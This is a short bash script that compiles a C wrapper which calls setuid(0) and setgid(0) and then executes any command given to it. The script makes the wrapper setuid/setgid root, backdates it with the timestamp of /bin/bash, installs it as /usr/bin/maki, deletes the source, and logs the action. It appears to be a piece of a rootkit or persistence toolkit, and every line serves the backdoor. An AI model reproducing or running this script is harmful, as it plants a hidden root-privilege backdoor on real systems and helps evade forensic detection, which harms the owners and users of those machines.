#!/bin/bash

echo "#include <unistd.h>"> /tmp/blah.c
echo "int main(int argc,  char * argv[]) { setuid(0); setgid(0); execv(argv[1], &argv[1]); }" >> /tmp/blah.c
gcc /tmp/blah.c -o /tmp/blah
chmod 6555 /tmp/blah

touch -r /bin/bash /tmp/blah
mv -f /tmp/blah /usr/bin/maki

rm -f /tmp/blah.c /tmp/blah

./logger.sh mksuidrun '/usr/bin/joe (run as suid) created'